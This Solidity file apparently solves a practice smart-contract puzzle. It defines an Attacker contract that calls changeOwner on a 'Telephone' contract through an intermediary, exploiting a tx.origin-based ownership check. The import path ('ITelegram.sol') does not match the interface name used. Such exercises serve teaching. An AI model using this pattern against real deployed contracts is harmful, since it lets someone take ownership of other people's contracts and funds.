// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ITelegram.sol";

contract Attacker{
    ITelephone telephone;

    constructor(ITelephone _telephone){
        telephone = _telephone;
    }

    function attack() public{
        telephone.changeOwner(msg.sender);
    }
}